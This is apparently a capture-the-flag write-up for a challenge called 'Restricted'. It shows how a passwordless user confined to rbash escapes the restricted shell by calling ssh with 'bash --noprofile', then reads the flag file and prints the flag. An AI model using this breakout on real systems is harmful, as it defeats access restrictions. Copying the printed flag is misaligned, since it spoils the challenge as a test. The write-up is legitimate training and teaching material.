# Restricted

You 're still trying to collect information for your research on the alien relic. Scientists contained the memories of ancient egyptian mummies into small chips, where they could store and replay them at will. Many of these mummies were part of the battle against the aliens and you suspect their memories may reveal hints to the location of the relic and the underground vessels. You managed to get your hands on one of these chips but after you connected to it, any attempt to access its internal data proved futile. The software containing all these memories seems to be running on a restricted environment which limits your access. Can you find a way to escape the restricted environment ?

## Writeup

The docker container has a **restricted** user account with no password and has a **rbash**.

We can see it from the following lines of **DockerFile**:

```dockerfile
RUN adduser --disabled-password restricted
RUN usermod --shell /bin/rbash restricted
RUN sed -i -re 's/^restricted:[^:]+:/restricted::/' /etc/passwd /etc/shadow
```

Login into it:

```bash
ssh restricted@161.35.168.118 -p 31637
```

He can execute command from **.bin** directory that there are these programs:

```
ssh  top  uptime 
```

We can use **ssh** to escape from the **rbash**:

```bash
ssh -p 1337 restricted@localhost -t "bash --noprofile"
```

We are escaped from the **rbash**, we can now cat the flag.

```bash
cat /flag_*
```

The flag is:

```
HTB{r35tr1ct10n5_4r3_p0w3r1355}
```